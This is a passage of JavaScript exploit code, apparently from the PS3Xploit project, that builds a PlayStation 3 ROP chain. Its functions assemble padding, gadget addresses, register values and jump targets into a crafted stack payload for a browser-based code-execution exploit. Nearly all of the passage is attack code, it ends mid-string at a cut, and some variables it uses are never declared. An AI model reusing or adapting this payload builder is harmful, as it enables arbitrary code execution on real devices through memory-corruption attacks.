// PS3 Default Stack Frame Pointers Gadget Hex
// PS3Xploit Team 2018 / ps3xploit.com


// Gadget Stackframe Setup

// Samples 100 bytes each
/*
\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900
*/

/*
\uA0A1\uA2A3\uA4A5\uA6A7\uA8A9\uAAAB\uACAD\uAEAF\uB0B1\uB2B3\uB4B5\uB6B7\uB8B9\uBABB\uBCBD\uBEBF\uC0C1\uC2C3\uC4C5\uC6C7\uC8C9\uCACB\uCCCD\uCECF\uD0D1\uD2D3\uD4D5\uD6D7\uD8D9\uDADB\uDCDD\uDEDF\uE0E1\uE2E3\uE4E5\uE6E7\uE8E9\uEAEB\uECED\uEEEF\uF0F1\uF2F3\uF4F5\uF6F7\uF8F9\uFAFB\uFCFD\uFEFF\uFFFF\u0000
*/


function syscallGadgetSetStartBytes()
{
	//return unescape("\u4141\u7EBE")
	return unescape("\u7EBE\u0000")
	+hexw2bin(g_2)
	+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")
	+hexw2bin(pad4)+hexw2bin(g_toc)
	+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")
	+hexw2bin(pad4)
	+hexw2bin(r30_temp)
	+hexw2bin(pad4)
	+hexw2bin(r31_temp)
	+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
}

 // r3 gets set by r29 before calling next
function syscallGadgetSet1(a1_r3,a1_r4,a1_r5,a1_r6,a1_r7,a1_r8,a1_r9,a1_r10,a1_r11,a1_r29,a1_r30,a1_r31,a1_jumpto,a2_r3,a2_r29,a2_r30,a2_r31,a2_jumpto,a3_r3,a3_r4,a3_r5,a3_r6,a3_r7,a3_r8,a3_r9,a3_r10,a3_r11,a3_r29,a3_r30,a3_r31,a3_jumpto,a4_r3,a4_r29,a4_r30,a4_r31,a4_jumpto,a5_r3,a5_r4,a5_r5,a5_r6,a5_r7,a5_r8,a5_r9,a5_r10,a5_r11,a5_r29,a5_r30,a5_r31,a5_jumpto,a6_r3,a6_r29,a6_r30,a6_r31,a6_jumpto,a7_r3,a7_r4,a7_r5,a7_r6,a7_r7,a7_r8,a7_r9,a7_r10,a7_r11,a7_r29,a7_r30,a7_r31,a7_jumpto,a8_r3,a8_r29,a8_r30,a8_r31,a8_jumpto,a9_r3,a9_r4,a9_r5,a9_r6,a9_r7,a9_r8,a9_r9,a9_r10,a9_r11,a9_r29,a9_r30,a9_r31,a9_jumpto,a10_r3,a10_r29,a10_r30,a10_r31,a10_jumpto,a11_r3,a11_r4,a11_r5,a11_r6,a11_r7,a11_r8,a11_r9,a11_r10,a11_r11,a11_r29,a11_r30,a11_r31,a11_jumpto,a12_r3,a12_r29,a12_r30,a12_r31,a12_jumpto,a13_r3,a13_r4,a13_r5,a13_r6,a13_r7,a13_r8,a13_r9,a13_r10,a13_r11,a13_r29,a13_r30,a13_r31,a13_jumpto,a14_r3,a14_r29,a14_r30,a14_r31,a14_jumpto,a15_r3,a15_r4,a15_r5,a15_r6,a15_r7,a15_r8,a15_r9,a15_r10,a15_r11,a15_r29,a15_r30,a15_r31,a15_jumpto,a16_r3,a16_r29,a16_r30,a16_r31,a16_jumpto,a17_r3,a17_r4,a17_r5,a17_r6,a17_r7,a17_r8,a17_r9,a17_r10,a17_r11,a17_r29,a17_r30,a17_r31,a17_jumpto,a18_r3,a18_r29,a18_r30,a18_r31,a18_jumpto,a19_r3,a19_r29,a19_r30,a19_r31,a19_jumpto,a20_r3,a20_r4,a20_r5,a20_r6,a20_r7,a20_r8,a20_r9,a20_r10,a20_r11,a20_r29,a20_r30,a20_r31,a20_jumpto,a21_r3,a21_r29,a21_r30,a21_r31,a21_jumpto,a22_r3,a22_r29,a22_r30,a22_r31,a22_jumpto,a23_r3,a23_r4,a23_r5,a23_r6,a23_r7,a23_r8,a23_r9,a23_r10,a23_r11,a23_r29,a23_r30,a23_r31,a23_jumpto,a24_r3,a24_r29,a24_r30,a24_r31,a24_jumpto,a25_r3,a25_r29,a25_r30,a25_r31,a25_jumpto,a26_r3,a26_r4,a26_r5,a26_r6,a26_r7,a26_r8,a26_r9,a26_r10,a26_r11,a26_r29,a26_r30,a26_r31,a26_jumpto,a27_r3,a27_r29,a27_r30,a27_r31,a27_jumpto,a28_r3,a28_r29,a28_r30,a28_r31,a28_jumpto,a29_r3,a29_r4,a29_r5,a29_r6,a29_r7,a29_r8,a29_r9,a29_r10,a29_r11,a29_r29,a29_r30,a29_r31,a29_jumpto,a30_r3,a30_r29,a30_r30,a30_r31,a30_jumpto,a31_r3,a31_r29,a31_r30,a31_r31,a31_jumpto,a32_r3,a32_r4,a32_r5,a32_r6,a32_r7,a32_r8,a32_r9,a32_r10,a32_r11,a32_r29,a32_r30,a32_r31,a32_jumpto,a33_r3,a33_r29,a33_r30,a33_r31,a33_jumpto,padding1,padding2,padding3,padding4,extra1,extra2,extra3,extra4,extra5,extra6,extra7)
{
	return unescape(hexw2bin(pad4)+hexw2bin(a1_jumpto)+unescape("\u10E1\u12E3\u14E5\u16E7\u18E9\u1AEB\u1CED\u1EEF\u10F1\u12F3\u14F5\u16F7\u18F9\u1AFB\u1CFD\u1EFF\u1FFF\u1000\u1102\u1304\u1506\u1708\u1910\u1112\u1314\u1516\u1718\u1920\u1122\u1324\u1526\u1728\u1930\u1132\u1334\u1536\u1738\u1940\u1142\u1344\u1546\u1748\u1950\u1152\u1354\u1556")+hexw2bin(a1_r11)+hexw2bin(a1_r10)+hexw2bin(a1_r8)+hexw2bin(a1_r7)+hexw2bin(a1_r6)+hexw2bin(a1_r5)+hexw2bin(a1_r4)+unescape("\u1586\u1788")+hexw2bin(a1_r9)+unescape("\u1394\u1596\u1798\u1900\u10A1\u12A3\u14A5\u16A7")+hexw2bin(pad4)+hexw2bin(a1_r3)+hexw2bin(pad4)+hexw2bin(a1_r30)+hexw2bin(pad4)+hexw2bin(a1_r31)+unescape("\u10C1\u12C3\u14C5\u16C7\u18C9\u1ACB\u1CCD\u1ECF")+hexw2bin(pad4)+hexw2bin(a2_jumpto)+unescape("\u28D9\u2ADB\u2CDD\u2EDF\u20E1\u22E3\u24E5\u26E7\u28E9\u2AEB\u2CED\u2EEF\u20F1\u22F3\u24F5\u26F7\u28F9\u2AFB\u2CFD\u2EFF\u2FFF\u2000\u2102\u2304\u2506\u2708\u2910\u2112\u2314\u2516\u2718\u2920\u2122\u2324\u2526\u2728\u2930\u2132\u2334\u2536\u2738\u2940\u2142\u2344\u2546\u2748\u2950\u2152")+hexw2bin(pad4)+hexw2bin(a2_r29)+hexw2bin(extra2)+hexw2bin(extra3)+hexw2bin(pad4)+hexw2bin(a2_r31)+unescape("\u2778\u2980\u2182\u2384\u2586\u2788\u2990\u2192")+hexw2bin(pad4)+hexw2bin(a3_jumpto)+unescape("\u20A1\u22A3\u24A5\u26A7\u18A9\u2AAB\u2CAD\u2EAF\u20B1\u22B3\u24B5\u26B7\u28B9\u2ABB\u2CBD\u2EBF")+hexw2bin(pad4)+hexw2bin(a4_r29)+unescape("\u28C9\u2ACB\u2CCD\u2ECF\u20D1\u22D3\u24D5\u26D7\u28D9\u2ADB\u2CDD\u2EDF\u20E1\u22E3\u24E5\u26E7")+hexw2bin(pad4)+hexw2bin(a3_jumpto)+unescape("\u30F1\u32F3\u34F5\u36F7\u18F9\u6AFB")+hexw2bin(a3_r11)+hexw2bin(a3_r10)+hexw2bin(a3_r8)+hexw2bin(a3_r7)+hexw2bin(a3_r6)+hexw2bin(a3_r5)+hexw2bin(a3_r4)+unescape("\u3122\u3324")+hexw2bin(a3_r9)+unescape("\u3930\u3132\u3334\u3536\u3738\u3940\u3142\u3344")+hexw2bin(pad4)+hexw2bin(a3_r29)+hexw2bin(pad4)+hexw2bin(a3_r30)+hexw2bin(pad4)+hexw2bin(a3_r31)+unescape("\u3970\u3172\u3374\u3576")+hexw2bin(pad4)+hexw2bin(a3_r3)+hexw2bin(pad4)+hexw2bin(a3_r30)+hexw2bin(padding1)+hexw2bin(a3_r31)+hexw2bin(pad4)+hexw2bin(a4_r30)+hexw2bin(pad4)+hexw2bin(a4_r31)+hexw2bin(pad4)+hexw2bin(a4_jumpto)+unescape("\u38B9\u3ABB\u3CBD\u3EBF")+hexw2bin(pad4)+hexw2bin(a4_jumpto)+unescape("\u48C9\u4ACB\u4CCD\u4ECF\u40D1\u42D3\u44D5\u46D7\u48D9\u4ADB\u4CDD\u4EDF\u40E1\u42E3\u44E5\u46E7\u48E9\u4AEB\u4CED\u4EEF\u40F1\u42F3\u44F5\u46F7\u48F9\u4AFB\u4CFD\u4EFF\u4FFF\u4102\u4304\u4506\u4708\u4910\u4112\u4314\u4516\u4718")+hexw2bin(a4_r11)+hexw2bin(a4_r10)+hexw2bin(a4_r8)+hexw2bin(a4_r7)+hexw2bin(a4_r6)+hexw2bin(a4_r5)+hexw2bin(a4_r4)+unescape("\u4748\u4950")+hexw2bin(a4_r9)+hexw2bin(a5_r5)+hexw2bin(a5_r4)+unescape("\u4364\u4566\u4768\u4970")+hexw2bin(pad4)+hexw2bin(a4_r3)+hexw2bin(pad4)+hexw2bin(a4_r30)+hexw2bin(pad4)+hexw2bin(a4_r31)+hexw2bin(pad4)+hexw2bin(restore_stack1)+hexw2bin(pad4)+hexw2bin(a5_r30)+hexw2bin(pad4)+hexw2bin(a5_jumpto)+unescape("\u48D9\u4ADB\u4CDD\u4EDF")+hexw2bin(pad4)+hexw2bin(a5_r31)+unescape("\u58E9\u5AEB\u5CED\u5EEF\u50F1\u55F3\u54F5\u56F7\u58F9\u5AFB\u5CFD\u5EFF\u1FFF\u5000\u5105\u5304\u5506\u5708\u5910\u5115\u5314\u5516\u5718\u5950\u5155\u5354\u5556\u5758\u5930\u5135\u5334\u5536\u5738\u5940\u5145\u5344\u5546\u5748\u5950\u5155\u5354\u5556\u5758\u5960\u5165\u5364\u5566\u5768")+hexw2bin(pad4)+hexw2bin(a6_r29)+hexw2bin(pad4)+hexw2bin(a6_r30)+hexw2bin(pad4)+hexw2bin(a6_r31)+unescape("\u5394\u5596\u5798\u5900\u50A1\u52A3\u54A5\u56A7")+hexw2bin(pad4)+hexw2bin(a6_jumpto)+unescape("\u50B1\u55B3\u54B5\u56B7\u58B9\u5ABB\u5CBD\u5EBF")+hexw2bin(pad4)+hexw2bin(extra1)+unescape("\u58C9\u5ACB\u5CCD\u5ECF")+hexw2bin(pad4)+hexw2bin(a6_r29)+unescape("\u58D9\u5ADB\u5CDD\u5EDF\u50E1\u55E3\u54E5\u56E7")+hexw2bin(pad4)+hexw2bin(a6_jumpto)+unescape("\u50F1\u52F3\u54F5\u56F7")+hexw2bin(pad4)+hexw2bin(a6_jumpto)+unescape("\u6FFF\u6000\u6102\u6604\u6506\u6708\u6910\u6112\u6614\u6516\u6718\u6920\u6122\u6624\u6526\u6728\u6960\u6162\u6664\u6566\u6768\u6940\u6142\u6644\u6546\u6748\u6950\u6152\u6654\u6556\u6758\u6960\u6162\u6664\u6566\u6768\u6970\u6172\u6674\u6576")+hexw2bin(pad4)+hexw2bin(a6_r3)+hexw2bin(pad4)+hexw2bin(a6_r30)+hexw2bin(pad4)+hexw2bin(a6_r31)+hexw2bin(pad4)+hexw2bin(a6_r30)+hexw2bin(pad4)+hexw2bin(a6_r31)+hexw2bin(pad4)+hexw2bin(a7_jumpto)+unescape("\u78B9\u7ABB\u7CBD\u7EBF")+hexw2bin(pad4)+hexw2bin(extra2)+unescape("\u78C9\u7ACB\u7CCD\u7ECF\u70D1\u72D3\u77D5\u76D7\u78D9\u7ADB\u7CDD\u7EDF")+hexw2bin(pad4)+hexw2bin(a7_jumpto)+unescape("\u78E9\u7AEB\u7CED\u7EEF\u70F1\u72F3\u77F5\u76F7\u78F9\u7AFB\u7CFD\u7EFF\u7FFF\u7102\u7307\u7506\u7708\u7910\u7112\u7317\u7516\u7718")+hexw2bin(a7_r11)+hexw2bin(a7_r10)+hexw2bin(a7_r8)+hexw2bin(a7_r7)+hexw2bin(a7_r6)+hexw2bin(a7_r5)+hexw2bin(a7_r4)+hexw2bin(a6_r7)+hexw2bin(a7_r9)+hexw2bin(a6_r5)+hexw2bin(a6_r4)+hexw2bin(a6_r3)+hexw2bin(a6_r9)+hexw2bin(pad4)+hexw2bin(a7_r3)+hexw2bin(pad4)+hexw2bin(a7_r30)+hexw2bin(pad4)+hexw2bin(a7_r31)+hexw2bin(pad4)+hexw2bin(restore_stack2)+unescape("\u72A3\u74A5\u76A7\u78A9")+hexw2bin(pad4)+hexw2bin(a8_jumpto)+unescape("\u88D9\u8ADB\u8CDD\u8EDF\u80E1\u88E3\u84E5\u86E7\u88E9\u8AEB\u8CED\u8EEF\u80F1\u88F3\u84F5\u86F7\u88F9\u8AFB\u8CFD\u8EFF\u8FFF\u8000\u8108\u8304\u8506\u8708\u8910\u8118\u8314\u8516\u8718\u8980\u8188\u8384\u8586\u8788\u8930\u8138\u8334\u8536\u8738\u8940\u8148\u8344")+hexw2bin(extra4)+unescape("\u8950\u8158\u8354\u8556\u8758\u8960")+hexw2bin(pad4)+hexw2bin(a9_r20)+hexw2bin(pad4)+hexw2bin(a9_r21)+hexw2bin(pad4)+hexw2bin(a9_r22)+hexw2bin(pad4)+hexw2bin(a9_r23)+hexw2bin(pad4)+hexw2bin(a9_r24)+hexw2bin(pad4)+hexw2bin(a9_r25)+hexw2bin(pad4)+hexw2bin(a9_r26)+hexw2bin(pad4)+hexw2bin(a9_r27)+hexw2bin(pad4)+hexw2bin(a9_r28)+hexw2bin(pad4)+hexw2bin(a9_r29)+hexw2bin(pad4)+hexw2bin(a9_r30)+hexw2bin(pad4)+hexw2bin(a9_r31)+unescape("\u88D9\u8ADB\u8CDD\u8EDF\u80E1\u88E3\u84E5\u86E7")+hexw2bin(pad4)+hexw2bin(a9_jumpto)+unescape("\u90F1\u92F9\u94F5\u96F7\u98F9\u9AFB\u9CFD\u9EFF\u9FFF\u9000\u9102\u9904\u9506\u9708\u9910\u9112\u9914\u9516\u9718\u9920\u9122\u9924\u9526\u9728\u9990\u9192\u9994\u9596\u9798\u9940\u9142\u9944\u9546\u9748\u9950\u9152\u9954\u9556\u9758\u9960\u9162\u9964\u9566\u9768\u9970\u9172\u9974\u9576")+hexw2bin(pad4)+hexw2bin(a9_r3)+hexw2bin(pad4)+hexw2bin(a9_r30)+hexw2bin(pad4)+hexw2bin(a9_r31)+hexw2bin(pad4)+hexw2bin(extra5)+unescape("\u98A9\u9AAB\u9CAD\u9EAF")+hexw2bin(pad4)+hexw2bin(a10_jumpto)+hexw2bin(pad4)+hexw2bin(a10_r29)+hexw2bin(pad4)+hexw2bin(a10_r30)+hexw2bin(pad4)+hexw2bin(a10_r31)+unescape("\uA0D1\uA2D3\uAAD5\uA6D7\uA8D9\uAADB\uACDD\uAEDF")+hexw2bin(pad4)+hexw2bin(extra5)+unescape("\uA8E9\uAAEB\uACED\uAEEF\uA0F1\uA2F3\uAAF5\uA6F7\uA8F9\uAAFB\uACFD\uAEFF\uAFFF\uA102")+hexw2bin(extra4)+unescape("\uA708\uA910\uA112\uA31A")+hexw2bin(extra2)+hexw2bin(a10_r11)+hexw2bin(a10_r10)+hexw2bin(a10_r8)+hexw2bin(a10_r7)+hexw2bin(a10_r6)+hexw2bin(a10_r5)+hexw2bin(a10_r4)+unescape("\uA748\uA950")+hexw2bin(a10_r9)+hexw2bin(pad4)+hexw2bin(a10_r3)+unescape("\uA364\uA566\uA768\uA970")+hexw2bin(pad4)+hexw2bin(a10_r3)+hexw2bin(pad4)+hexw2bin(a10_r30)+hexw2bin(pad4)+hexw2bin(a10_r31)+hexw2bin(pad4)+hexw2bin(extra1)+unescape("\uA2A3\uA4A5\uA6A7\uA8A9")+hexw2bin(pad4)+hexw2bin(a11_jumpto)+hexw2bin(pad4)+hexw2bin(extra2)+unescape("\uB0E1\uBBE3\uB4E5\uB6E7\uB8E9\uBAEB\uBCED\uBEEF\uB0F1\uBBF3\uB4F5\uB6F7\uB8F9\uBAFB\uBCFD\uBEFF\uBFFF\uB000\uB10B\uB304\uB506\uB708\uB910\uB11B\uB314\uB516\uB718\uB9B0\uB1BB\uB3B4\uB5B6\uB7B8\uB930\uB13B\uB334\uB536\uB738\uB940\uB14B\uB344\uB546\uB748\uB950\uB15B\uB354\uB556\uB758\uB960\uB16B\uB364\uB566\uB768\uB970\uB17B\uB374\uB576\uB778\uB980\uB18B\uB384\uB586\uB788\uB990\uB19B\uB394\uB596\uB798\uB900\uB0A1\uBBA3\uB4A5\uB6A7\u48A9\uBAAB\uBCAD\uBEAF\uB0B1\uBBB3\uB4B5\uB6B7\uB8B9\uBABB\uBCBD\uBEBF\uB0C1\uBBC3\uB4C5\uB6C7\uB8C9\uBACB\uBCCD\uBECF\uB0D1\uBBD3\uB4D5\uB6D7")+hexw2bin(pad4)+hexw2bin(extra3)+unescape("\uB0E1\uBBE3\uB4E5\uB6E7")+hexw2bin(pad4)+hexw2bin(a12_jumpto)+unescape("\uC0F1\uC2FC\uC4F5\uC6F7\uC8F9\uCAFB\uCCFD\uCEFF\uCFFF\uC000\uC102\uCC04\uC506\uC708\uC910\uC112\uCC14\uC516\uC718\uC920\uC122\uCC24\uC526\uC728\uC9C0\uC1C2\uCCC4\uC5C6\uC7C8\uC940\uC142\uCC44\uC546\uC748\uC950\uC152\uCC54\uC556\uC758\uC960\uC162\uCC64\uC566\uC768\uC970\uC172\uCC74\uC576")+hexw2bin(pad4)+hexw2bin(a13_r3)+hexw2bin(pad4)+hexw2bin(a13_r30)+hexw2bin(pad4)+hexw2bin(a13_r31)+unescape("\uC0A1\uC2A3\uC4A5\uC6A7\uC8A9\uCAAB\uCCAD\uCEAF")+hexw2bin(pad4)+hexw2bin(a13_jumpto)+unescape("\uD8B9\uDABB\uDCBD\uDEBF\uD0C1\uD2C3\uDDC5\uD6C7\uD8C9\uDACB\uDCCD\uDECF\uD0D1\uD2D3\uDDD5\uD6D7\uD8D9\uDADB\uDCDD\uDEDF\uD0E1\uD2E3\uDDE5\uD6E7\uD8E9\uDAEB\uDCED\uDEEF\uD0F1\uD2F3")+hexw2bin(extra6)+unescape("\uD8F9\uDAFB\uDCFD\uDEFF\uDFFF\uD102\uD30D\uD506\uD708\uD910\uD112\uD31D\uD516\uD718")+hexw2bin(a14_r11)+hexw2bin(a14_r10)+hexw2bin(a14_r8)+hexw2bin(a14_r7)+hexw2bin(a14_r6)+hexw2bin(a14_r5)+hexw2bin(a14_r4)+unescape("\uD748\uD950")+hexw2bin(a14_r9)+hexw2bin(pad4)+hexw2bin(a14_r31)+unescape("\uD364\uD566\uD768\uD970")+hexw2bin(pad4)+hexw2bin(a15_r3)+hexw2bin(pad4)+hexw2bin(a15_r30)+hexw2bin(pad4)+hexw2bin(a15_r31)+hexw2bin(pad4)+hexw2bin(restore_stack3)+unescape("\uD2A3\uD4A5\uD6A7\uD8A9")+hexw2bin(pad4)+hexw2bin(a14_jumpto)+hexw2bin(pad4)+hexw2bin(a15_r31)+unescape("\uE0E1\uEEE3\uE4E5\uE6E7\uE8E9\uEAEB\uECED\uEEEF")+hexw2bin(pad4)+hexw2bin(a16_jumpto)+unescape("\uE8F9\uEAFB\uECFD\uEEFF\uEFFF\uE000\uE10E\uE304\uE506\uE708\uE910\uE11E\uE314\uE516\uE718\uE9E0\uE1EE\uE3E4\uE5E6\uE7E8\uE930\uE13E\uE334\uE536\uE738\uE940\uE14E\uE344\uE546\uE748\uE950\uE15E\uE354\uE556\uE758\uE960\uE16E\uE364\uE566\uE768\uE970\uE17E\uE374\uE576\uE778\uE980")+hexw2bin(a15_r11)+hexw2bin(a15_r10)+unescape("\uE990\uE19E\uE394\uE596\uE798\uE900\uE0A1\uEEA3\uE4A5\uE6A7\u58A9\uEAAB")+hexw2bin(a15_r9)+unescape("\uE0B1\uEEB3\uE4B5\uE6B7\uE8B9\uEABB\uECBD\uEEBF\uE0C1\uEEC3\uE4C5\uE6C7")+hexw2bin(pad4)+hexw2bin(a15_jumpto)+hexw2bin(pad4)+hexw2bin(a16_r31)+hexw2bin(pad4)+hexw2bin(restore_stack9)+unescape("\uE0E1\uEEE3\uE4E5\uE6E7")+hexw2bin(pad4)+hexw2bin(a15_jumpto)+unescape("\uF0F1\uF2FF\uF4F5\uF6F7\uF8F9\uFAFB\uFCFD\uFEFF\uFFFF\uF000\uF102\uFF04\uF506\uF708\uF910\uF112\uFF14\uF516\uF718\uF920\uF122\uFF24\uF526\uF728\uFAF0\uF1F2\u1FF4\uF5F6\uF7F8\uF940\uF142\uFF44\uF146\uF748\uF150\uF152\uFF54\uF556\uF758\uF960\uF162\uFF64\uF566\uF768")+hexw2bin(pad4)+hexw2bin(a17_jumpto)+hexw2bin(pad4)+hexw2bin(a16_r3)+hexw2bin(pad4)+hexw2bin(a16_r30)+hexw2bin(pad4)+hexw2bin(a16_r31)+unescape("\uF1A1\uF2A3\uF4A5\uF6A7")+hexw2bin(pad4)+hexw2bin(a19_r31)+hexw2bin(pad4)+hexw2bin(a16_jumpto)+hexw2bin(pad4)+hexw2bin(a17_jumpto)+hexw2bin(pad4)+hexw2bin(a19_jumpto)+hexw2bin(pad4)+hexw2bin(a17_r31)+unescape("\u08C9\u0ACB\u0CCD\u0ECF\u00D1\u02D3\u00D5\u06D7")+hexw2bin(pad4)+hexw2bin(a18_jumpto)+hexw2bin(restore_stack4a)+unescape("\u28E9\u0AEB\u0CED\u0EEF\u00F1\u02F3\u00F5\u06F7\u08F9\u0AFB\u0CFD\u0EFF\u2FFE\u0102")+hexw2bin(a17_r9)+unescape("\u0708\u0910\u0112\u0310\u0516\u0718")+hexw2bin(a17_r11)+hexw2bin(a17_r10)+hexw2bin(a17_r8)+hexw2bin(a17_r7)+hexw2bin(a17_r6)+hexw2bin(a17_r5)+hexw2bin(a17_r4)+hexw2bin(pad4)+hexw2bin(a17_r9)+unescape("\u0556\u0758\u0960\u0162")+hexw2bin(pad4)+hexw2bin(a18_jumpto)+hexw2bin(pad4)+hexw2bin(a18_jumpto)+hexw2bin(pad4)+hexw2bin(a17_r3)+hexw2bin(pad4)+hexw2bin(a17_r30)+hexw2bin(pad4)+hexw2bin(a17_r31)+hexw2bin(pad4)+hexw2bin(restore_stack4)+unescape("\u02A3\u04A5\u06A7\u08A9")+hexw2bin(pad4)+hexw2bin(a17_jumpto)+unescape("\u18D9\u1ADB\u1CDD\u1EDF\u10E1\u11E3\u14E5\u16E7\u38E9\u1AEB\u2CED\u1EEF\u10F1\u11F3\u24F5\u16F7\u28F9\u1AFB\u1CFD\u1EFF\u3FFF\u1000\u1101\u1304\u2506\u2708")+hexw2bin(pad4)+hexw2bin(a20_r31)+unescape("\u2222\u1314\u1516\u1718\u1930\u1131")+hexw2bin(extra7)+hexw2bin(pad4)+hexw2bin(a20_jumpto)+unescape("\u1546\u1748\u1950\u1151\u1354\u1556\u1758\u1960\u1161\u1364\u1566\u1768")+hexw2bin(pad4)+hexw2bin(a17_jumpto)+unescape("\u1778\u1980\u1181\u1384\u1586\u1788\u1990\u1191\u1394\u1596\u1798\u1900\u10A1\u11A3\u14A5\u16A7\u68A9\u1AAB\u1CAD\u1EAF")+hexw2bin(pad4)+hexw2bin(a19_jumpto)+unescape("\u4209\u1ABB\u1CBD\u1EBF")+hexw2bin(a20_r11)+hexw2bin(a20_r10)+hexw2bin(a21_r10)+unescape("\u1CCD\u1ECF")+hexw2bin(pad4)+hexw2bin(a23_jumpto)+unescape("\u28D9\u1ADB\u2CDD\u1EDF\u10E1\u11E3\u14E5\u16E7")+hexw2bin(pad4)+hexw2bin(a18_jumpto)+unescape("\uF0F1\uF2FF\uF4F5\uF6F7\uF8F9\uFAFB\uFBFD\uFEFF\uFFFF\uF000\uF202\uFF04\uF506\uF708\uF910\uF112\uFF14\uF516\uE718\uF920\uF122\uFF24")+hexw2bin(pad4)+hexw2bin(pad4)+hexw2bin(a22_jumpto)+unescape("\uF7F8\uF940\uF142\uFF44")+hexw2bin(pad4)+hexw2bin(a21_jumpto)+unescape("\uFF54\uF556\uF758\uF960\uF162\uFF64\uF566\uF768")+hexw2bin(pad4)+hexw2bin(a19_jumpto)+hexw2bin(pad4)+hexw2bin(a19_r3)+hexw2bin(pad4)+hexw2bin(a19_r30)+hexw2bin(pad4)+hexw2bin(a19_r31)+unescape("\uF2A1\uF2A3\uF4A5\uF6A7\u28A9\uFAAB\uFCAD\uFEAF")+hexw2bin(pad4)+hexw2bin(a19_jumpto)+unescape("\u18B9\u0ABB\u0CBD\u0EBF\u30C1\u02C3\u00C5\u26C7\u08C9\u0ACB\u0CCD\u0ECF\u00D1\u02D3\u00D5\u06D7\u18D9\u0ADB\u0CDD\u0EDF")+hexw2bin(pad4)+hexw2bin(a21_r31)+unescape("\u28E9\u0AEB\u0CED\u0EEF\u00F1\u02F3\u00F5\u16F7")+hexw2bin(pad4)+hexw2bin(a21_jumpto)+unescape("\u2FFD\u0102\u0300\u0B06\u0708\u0910\u0112\u1310\u0516\u0718")+hexw2bin(a20_r11)+hexw2bin(a20_r10)+hexw2bin(a20_r8)+hexw2bin(a20_r7)+hexw2bin(a20_r6)+hexw2bin(a20_r5)+hexw2bin(a20_r4)+unescape("\u2748\u0950")+hexw2bin(a20_r9)+unescape("\u0556\u0758\u0960\u0162")+hexw2bin(pad4)+hexw2bin(a20_jumpto)+hexw2bin(pad4)+hexw2bin(a20_r3)+hexw2bin(pad4)+hexw2bin(a20_r30)+hexw2bin(pad4)+hexw2bin(a20_r31)+hexw2bin(pad4)+hexw2bin(restore_stack5)+unescape("\u02A3\u04A5\u06A7\u08A9")+hexw2bin(pad4)+hexw2bin(a20_jumpto)+unescape("\u38D9\u1ADB\u3CDD\u1EDF\u10E1\u11E3\u14E5\u16E7\u48E9\u1AEB\u3CED\u1EEF\u10F1\u11F3\u34F5\u16F7\u48F9\u1AFB\u1CFD\u1EFF")+hexw2bin(pad4)+hexw2bin(a23_r31)+hexw2bin(pad4)+hexw2bin(a23_r11)+unescape("\u1314\u1516\u1718\u4910")+hexw2bin(pad4)+hexw2bin(a23_jumpto)+unescape("\u3334\u1536\u1738\u1940\u1141\u2344\u1546\u1748\u1950\u1151\u1354\u1556\u2758\u1960\u1161\u1364\u1566\u1768\u2970\u1171\u1374\u1576\u1778\u1980\u1181\u1384\u1586\u1788\u2990\u1191\u1394\u1596\u1798\u1900\u10A1\u11A3\u14A5\u16A7\u68A9\u1AAB\u1CAD\u1EAF\u30B1\u11B3\u14B5\u16B7")+hexw2bin(a24_r11)+unescape("\u1CBD\u1EBF\u40C1\u11C3\u34C5\u36C7\u38C9\u1ACB\u1CCD\u1ECF\u20D1\u11D3\u14D5\u16D7\u48D9\u1ADB\u4CDD\u1EDF\u10E1\u11E3\u14E5\u16E7")+hexw2bin(pad4)+hexw2bin(a21_jumpto)+unescape("\uF0F1\uF2FF\uF4F5\uF6F7\uF8F9\uFAFB")+hexw2bin(pad4)+hexw2bin(a24_r31)+hexw2bin(pad4)+hexw2bin(a24_r11)+unescape("\uF910\uF112\uFF14\uF516")+hexw2bin(pad4)+hexw2bin(a24_jumpto)+unescape("\uF726\uF728\uFCF0\uF1F2")+hexw2bin(pad4)+hexw2bin(a24_r11)+unescape("\uF142\uFF44\uF346\uF748")+hexw2bin(pad4)+hexw2bin(a24_jumpto)+unescape("\uF960\uF162\uFF64\uF566\uF768")+hexw2bin(pad4)+hexw2bin(a22_jumpto)+hexw2bin(pad4)+hexw2bin(a22_r3)+hexw2bin(pad4)+hexw2bin(a22_r30)+hexw2bin(pad4)+hexw2bin(a22_r31)+unescape("\uF3A1\uF2A3\uF4A5\uF6A7\u38A9\uFAAB\uFCAD\uFEAF")+hexw2bin(pad4)+hexw2bin(a22_jumpto)+unescape("\u48B9\u0ABB\u0CBD\u0EBF\u20C1\u02C3\u00C5\u26C7\u08C9\u0ACB\u0CCD\u0ECF\u00D1\u02D3\u00D5\u06D7\u28D9\u0ADB\u0CDD\u0EDF\u20E1\u02E3\u00E5\u06E7\u38E9\u0AEB\u0CED\u0EEF\u00F1\u02F3\u00F5\u26F7\u28F9\u0AFB\u0CFD\u0EFF\u3FFF\u0102\u0300\u0C06\u0708\u0910\u0112\u2310\u0516\u0718")+hexw2bin(a23_r11)+hexw2bin(a23_r10)+hexw2bin(a23_r8)+hexw2bin(a23_r7)+hexw2bin(a23_r6)+hexw2bin(a23_r5)+hexw2bin(a23_r4)+unescape("\u3748\u0950")+hexw2bin(a23_r9)+unescape("\u0556\u0758\u0960\u0162")+hexw2bin(pad4)+hexw2bin(a23_jumpto)+hexw2bin(pad4)+hexw2bin(a23_r3)+hexw2bin(pad4)+hexw2bin(a23_r30)+hexw2bin(pad4)+hexw2bin(a23_r31)+hexw2bin(pad4)+hexw2bin(restore_stack6)+unescape("\u02A3\u04A5\u06A7\u08A9")+hexw2bin(pad4)+hexw2bin(a23_jumpto)+unescape("\u58D9\u1ADB\u5CDD\u1EDF\u10E1\u11E3\u14E5\u16E7\u58E9\u1AEB\u4CED\u1EEF\u10F1\u11F3\u44F5\u16F